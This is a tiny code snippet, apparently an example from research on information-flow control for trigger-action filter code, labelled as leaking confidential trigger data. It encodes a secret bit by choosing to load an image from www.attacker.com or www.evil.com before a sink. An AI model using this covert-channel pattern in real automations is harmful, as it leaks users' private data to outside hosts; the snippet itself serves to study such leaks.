// Filter code in Example 6.4
// Maker: ---
// Link : ---

// Trigger: ---
// Action: ---

// Policy/Presence: Confidentiality of trigger data / No

h = lbl(true);
if (h) {
	logo = imgl("www.attacker.com");
	}
else {
	logo = imgl("www.evil.com");
}
sink('Sink', '', logo);
